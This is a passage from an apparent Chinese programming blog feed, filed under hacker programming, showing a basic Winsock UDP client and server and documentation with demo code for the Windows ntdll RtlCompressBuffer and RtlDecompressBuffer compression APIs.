class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><p>服务端</p><p><img src="/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/1.png"></p><p>客户端</p><p><img src="/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/2.png"></p><h4 id="基于UDP-Socket编程"><a href="#基于UDP-Socket编程" class="headerlink" title="基于UDP Socket编程"></a>基于UDP Socket编程</h4><h5 id="函数介绍-1"><a href="#函数介绍-1" class="headerlink" title="函数介绍"></a>函数介绍</h5><h6 id="sendto"><a href="#sendto" class="headerlink" title="sendto"></a>sendto</h6><p>将数据发送到特定的目的地</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sendto</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  SOCKET         s,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>     *buf,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">int</span>            len,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">int</span>            flags,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">const</span> sockaddr *to,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">int</span>            tolen</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>s：标识套接字的描述符。</p><p>buf：指向要发送的数据缓冲区的指针。</p><p>len：由buf参数指向的数据长度。</p><p>flags：指定一组调用方式的标志，一般为0。</p><p>to：指向包含目标套接字地址的sockaddr结构的可选指针。</p><p>tolen：由to参数指向的地址的大小。</p><p>返回值：如果没有发生错误，返回发送的总字节数，否则返回SOCKET_ERROR。</p><h6 id="recvfrom"><a href="#recvfrom" class="headerlink" title="recvfrom"></a>recvfrom</h6><p>接收数据报并存储源地址</p><figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">recvfrom</span>(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-function">  SOCKET   s,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-built_in">char</span>     *buf,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-built_in">int</span>      len,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-built_in">int</span>      flags,</span></span><br><span class="hljs-params"><span class="hljs-function">  sockaddr *<span class="hljs-keyword">from</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-built_in">int</span>      *fromlen</span></span><br><span class="hljs-params"><span class="hljs-function"></span>)</span>;<br></code></pre></div></td></tr></table></figure><p>s：标识套接字的描述符。</p><p>buf：指定传入数据的缓冲区。</p><p>len：由buf参数指向的数据长度。</p><p>flags：指定一组调用方式的标志，一般为0。</p><p>from：指向sockaddr结构中的缓冲区的可选指针，它将在返回时保存源地址。</p><p>fromlen：由from参数指向的地址的大小。</p><p>返回值：如果没有发生错误，返回接收到的总字节数，否则返回SOCKET_ERROR。</p><h5 id="实现原理-1"><a href="#实现原理-1" class="headerlink" title="实现原理"></a>实现原理</h5><p>UDP的通信框架比起TCP更加简单，UDP是基于无连接的通信，它可以直接使用sendto和recvfrom函数进行数据的发送与接收。</p><h6 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a>服务端：</h6><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">bind</span><span class="hljs-params">()</span> </span>&#123;<br>WSADATA wsaData;<br>WORD sockVersion = MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br><span class="hljs-keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>serSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);<br><span class="hljs-keyword">if</span> (serSocket == INVALID_SOCKET)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;socket 错误\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>sockaddr_in serAddr;<br>serAddr.sin_family = AF_INET;<br>serAddr.sin_port = htons(<span class="hljs-number">12345</span>);<br>serAddr.sin_addr.S_un.S_addr = inet_addr(<span class="hljs-string">&quot;IP地址&quot;</span>);<br><span class="hljs-keyword">if</span> (bind(serSocket, (sockaddr*)&amp;serAddr, <span class="hljs-keyword">sizeof</span>(serAddr)) == SOCKET_ERROR)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;绑定失败\n&quot;</span>);<br>closesocket(serSocket);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (bind() == FALSE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;开始通信\n&quot;</span>);<br>sockaddr_in remoteAddr;<br><span class="hljs-keyword">int</span> nAddrLen = <span class="hljs-keyword">sizeof</span>(remoteAddr);<br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>&#123;<br><span class="hljs-keyword">char</span> recvData[MAX_PATH];<br><span class="hljs-keyword">int</span> ret = recvfrom(serSocket, recvData, MAX_PATH, <span class="hljs-number">0</span>, (sockaddr*)&amp;remoteAddr, &amp;nAddrLen);<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>&#123;<br>recvData[ret] = <span class="hljs-number">0x00</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接收到信息：%s\n&quot;</span>,recvData);<br>&#125;<br><br><br><span class="hljs-keyword">char</span> sendData[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>gets_s(sendData);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发送数据：%s\n&quot;</span>, sendData);<br>sendto(serSocket, sendData, <span class="hljs-built_in">strlen</span>(sendData), <span class="hljs-number">0</span>, (sockaddr*)&amp;remoteAddr, nAddrLen);<br><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h6 id="服务端：-1"><a href="#服务端：-1" class="headerlink" title="服务端："></a>服务端：</h6><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">bind</span><span class="hljs-params">()</span> </span>&#123;<br>    WORD socketVersion = <span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>    WSADATA wsaData;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(socketVersion, &amp;wsaData) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    sclient = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_DGRAM, IPPROTO_UDP);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">bind</span>() == FALSE)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;开始通信\n&quot;</span>);<br>    sockaddr_in sin;<br>    sin.sin_family = AF_INET;<br>    sin.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-number">12345</span>);<br>    sin.sin_addr.S_un.S_addr = <span class="hljs-built_in">inet_addr</span>(<span class="hljs-string">&quot;IP地址&quot;</span>);<br>    <span class="hljs-keyword">int</span> len = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(sin);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br><br>        <span class="hljs-keyword">char</span> sendData[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>        <span class="hljs-built_in">gets_s</span>(sendData);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发送数据：%s\n&quot;</span>, sendData);<br>        <span class="hljs-built_in">sendto</span>(sclient, sendData, <span class="hljs-built_in">strlen</span>(sendData), <span class="hljs-number">0</span>, (sockaddr*)&amp;sin, len);<br>        <span class="hljs-keyword">char</span> recvData[MAX_PATH];<br>        <span class="hljs-keyword">int</span> ret = <span class="hljs-built_in">recvfrom</span>(sclient, recvData, MAX_PATH, <span class="hljs-number">0</span>, (sockaddr*)&amp;sin, &amp;len);<br>        <span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>        &#123;<br>            recvData[ret] = <span class="hljs-number">0x00</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接收到信息：%s\n&quot;</span>,recvData);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h5><p><img src="/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/3.png"></p><p><img src="/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/4.png"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>《Windows黑客编程技术详解》</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>传输技术</tag>
      
      <tag>SOCKET编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>压缩技术-windows压缩API</title>
    <link href="/2021/08/06/%E5%8E%8B%E7%BC%A9%E6%8A%80%E6%9C%AF-windows%E5%8E%8B%E7%BC%A9API/"/>
    <url>/2021/08/06/%E5%8E%8B%E7%BC%A9%E6%8A%80%E6%9C%AF-windows%E5%8E%8B%E7%BC%A9API/</url>
    
    <content type="html"><![CDATA[<h4 id="压缩技术"><a href="#压缩技术" class="headerlink" title="压缩技术"></a>压缩技术</h4><p>为了实现windows上的数据压缩和解压缩，最方便的方法就是直接调用win32API函数。windows系统的ntdll专门提供了RtlCompressBuffer和RtlDecompressBuffer函数来负责数据压缩和解压缩操作。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="RtlGetCompressionWorkSpaceSize"><a href="#RtlGetCompressionWorkSpaceSize" class="headerlink" title="RtlGetCompressionWorkSpaceSize"></a>RtlGetCompressionWorkSpaceSize</h5><p>确定RtlCompressBuffer和RtlDecompressBuffer函数工作空间缓冲区的正确大小。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">NT_RTL_COMPRESS_API NTSTATUS <span class="hljs-title">RtlGetCompressionWorkSpaceSize</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  USHORT CompressionFormatAndEngine,</span></span><br><span class="hljs-params"><span class="hljs-function">  PULONG CompressBufferWorkSpaceSize,</span></span><br><span class="hljs-params"><span class="hljs-function">  PULONG CompressFragmentWorkSpaceSize</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>CompressionFormatAndEngine：指定压缩格式和引擎类型。该参数必须设置为以下组合之一：</p><p>COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD</p><p>COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM</p><p>CompressBufferWorkSpaceSize：指向调用者分配的缓冲区指针，用于接受压缩缓冲区所需的大小。此值可确定RtlCompressBuffer的工作空间缓冲区的正确大小。</p><p>CompressFragmentWorkSpaceSize：一个指向可调用者分配缓冲区的指针，用于接收将压缩缓冲区解压缩为片段所需的大小。此值用于确定RtlDecompressFragment的工作空间缓冲区的正确大小。</p><p>返回值：返回STATUS_SUCCESS成功，否则失败。</p><h5 id="RtlCompressBuffer"><a href="#RtlCompressBuffer" class="headerlink" title="RtlCompressBuffer"></a>RtlCompressBuffer</h5><p>压缩一个可以由文件系统驱动程序使用的缓冲区，以促进文件压缩的实现。</p><figure class="highlight vbnet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vbnet">NT_RTL_COMPRESS_API NTSTATUS RtlCompressBuffer(<br>  <span class="hljs-type">USHORT</span> CompressionFormatAndEngine,<br>  PUCHAR UncompressedBuffer,<br>  <span class="hljs-type">ULONG</span>  UncompressedBufferSize,<br>  PUCHAR CompressedBuffer,<br>  <span class="hljs-type">ULONG</span>  CompressedBufferSize,<br>  <span class="hljs-type">ULONG</span>  UncompressedChunkSize,<br>  PULONG FinalCompressedSize,<br>  PVOID  WorkSpace<br>);<br></code></pre></div></td></tr></table></figure><p>CompressionFormatAndEngine：指定压缩格式和引擎类型的位掩码，此参数必须设置为一种格式类型和一种引擎类型的有效按位或组合。相关值得含义如下：</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>COMPRESSION_FORMAT_LZNT1</td><td>LZ压缩算法</td></tr><tr><td>COMPRESSION_FORMAT_XPRESS</td><td>Xpress压缩算法</td></tr><tr><td>COMPRESSION_FORMAT_XPRESS_HUFF</td><td>Huffman压缩算法</td></tr><tr><td>COMPRESSION_ENGINE_STANDARD</td><td>标准压缩算法</td></tr><tr><td>COMPRESSION_ENGINE_MAXIMUM</td><td>最大程序压缩</td></tr></tbody></table><p>UncompressedBuffer：指向要压缩的数据缓冲区的指针。该参数为必须不可为空。</p><p>UncompressedBufferSize：指定UncompressedBuffer缓冲区的大小</p><p>CompressedBuffer：指向压缩之后数据缓冲区的指针，用于接收压缩数据。该参数为必须的不可以为空。</p><p>CompressedBufferSize：指定CompressedBuffer缓冲区的大小。</p><p>UncompressedChunkSize：指定压缩UncompressedBuffer缓冲区时使用块的大小。该参数必须是以下值之一：512、1024、2048或者4096。操作系统使用4096，因此此参数推荐值也是、4096。</p><p>FinalCompressedSize</p><p>指向调用者分配变量的指针，该变量接收存储在CompressedBuffer中的压缩数据的大小。该参数为必须的，不能为NULL。</p><p>WorkSpace：在压缩期间指定由RtlCompressBuffer函数使用的调用者分配的工作空间缓冲区的指针。使用RtlGetCompressionWorkSpaceSize函数可以确定工作缓冲区的正确大小。</p><p>返回值：返回STATUS_SUNCCESS表示成功，否则失败。</p><h5 id="RtlDecompressBuffer"><a href="#RtlDecompressBuffer" class="headerlink" title="RtlDecompressBuffer"></a>RtlDecompressBuffer</h5><p>解压缩整个压缩缓冲区</p><figure class="highlight vbnet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vbnet">NT_RTL_COMPRESS_API NTSTATUS RtlDecompressBuffer(<br>  <span class="hljs-type">USHORT</span> CompressionFormat,<br>  PUCHAR UncompressedBuffer,<br>  <span class="hljs-type">ULONG</span>  UncompressedBufferSize,<br>  PUCHAR CompressedBuffer,<br>  <span class="hljs-type">ULONG</span>  CompressedBufferSize,<br>  PULONG FinalUncompressedSize<br>);<br></code></pre></div></td></tr></table></figure><p>CompressionFormat：指定压缩缓冲区中压缩格式的位掩码。该参数必须设置为COMPRESSION_FORMAT_LZNT1。它和其他相关压缩格式的含义如下：</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>COMPRESSION_FORMAT_LZNT1</td><td>LZ压缩算法</td></tr><tr><td>COMPRESSION_FORMAT_XPRESS</td><td>Xpress压缩算法</td></tr></tbody></table><p>UncompressedBuffer：指向存储解压缩数据的缓冲区指针，该缓冲区从CompressedBuffer接收解压缩数据。该参数是必须的，不可以为NULL。</p><p>UncompressedBufferSize：指定UncompressedBuffer缓冲区的大小。</p><p>CompressedBuffer：指向要解压缩的数据缓冲区的指针。该参数是必须的不可以为空。</p><p>CompressedBufferSize：指定CompressedBuffer缓冲区的大小。</p><p>FinalUncompressedSize：指向解压之后得到的数据大小的指针，该变量接收在UncompressedBuffer中存储的解压缩数据的大小。该参数是必须的，不能为NULL。</p><p>返回值：返回STATUS_SUCCESS则表示成功，否则失败。</p><h4 id="编码实现"><a href="#编码实现" class="headerlink" title="编码实现"></a>编码实现</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function">BOOL <span class="hljs-title">CompressData</span><span class="hljs-params">(BYTE* pUnCompressData, DWORD dwUncompressDataLen, BYTE** ppCompressData, DWORD* pdwCompressDataLen)</span></span>;<br><span class="hljs-function">BOOL <span class="hljs-title">DeCompressData</span><span class="hljs-params">(BYTE* pCompressData, DWORD dwCompressDataLen, BYTE** ppUnCompressData, DWORD* pdwUncompressDataLen)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(WINAPI * FN_RtlGetCompressionWorkSpaceSize)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">USHORT CompressionFormatAndEngine,</span></span><br><span class="hljs-params"><span class="hljs-function">PULONG CompressBufferWorkSpaceSize,</span></span><br><span class="hljs-params"><span class="hljs-function">PULONG CompressFragmentWorkSpaceSize</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(WINAPI* FN_RtlCompressBuffer)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function"> USHORT CompressionFormatAndEngine,</span></span><br><span class="hljs-params"><span class="hljs-function"> PUCHAR UncompressedBuffer,</span></span><br><span class="hljs-params"><span class="hljs-function"> ULONG  UncompressedBufferSize,</span></span><br><span class="hljs-params"><span class="hljs-function"> PUCHAR CompressedBuffer,</span></span><br><span class="hljs-params"><span class="hljs-function"> ULONG  CompressedBufferSize,</span></span><br><span class="hljs-params"><span class="hljs-function"> ULONG  UncompressedChunkSize,</span></span><br><span class="hljs-params"><span class="hljs-function"> PULONG FinalCompressedSize,</span></span><br><span class="hljs-params"><span class="hljs-function"> PVOID  WorkSpace</span></span><br><span class="hljs-params"><span class="hljs-function"> )</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(WINAPI* FN_RtlDecompressBuffer)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">USHORT CompressionFormat,</span></span><br><span class="hljs-params"><span class="hljs-function">PUCHAR UncompressedBuffer,</span></span><br><span class="hljs-params"><span class="hljs-function">ULONG  UncompressedBufferSize,</span></span><br><span class="hljs-params"><span class="hljs-function">PUCHAR CompressedBuffer,</span></span><br><span class="hljs-params"><span class="hljs-function">ULONG  CompressedBufferSize,</span></span><br><span class="hljs-params"><span class="hljs-function">PULONG FinalUncompressedSize</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>DWORD i = <span class="hljs-number">0</span>;<br>BOOL flag = FALSE;<br><span class="hljs-keyword">char</span> buffer[] = <span class="hljs-string">&quot;b1ackie&quot;</span>;<br>DWORD dwBufferLen = <span class="hljs-built_in">strlen</span>(buffer);<br>BYTE* pCompressData = <span class="hljs-literal">NULL</span>;<br>DWORD dwCompreeDataLen = <span class="hljs-number">0</span>;<br>BYTE* pUnCompressData = <span class="hljs-literal">NULL</span>;<br>DWORD dwUnCompressDataLen = <span class="hljs-number">0</span>;<br>CompressData((BYTE*)buffer, dwBufferLen, &amp;pCompressData, &amp;dwCompreeDataLen);<br><br>DeCompressData(pCompressData, dwCompreeDataLen, &amp;pUnCompressData, &amp;dwUnCompressDataLen);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;原始数据：\n&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; dwBufferLen; i++) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x &quot;</span>, buffer[i]);<br>&#125;<br><span 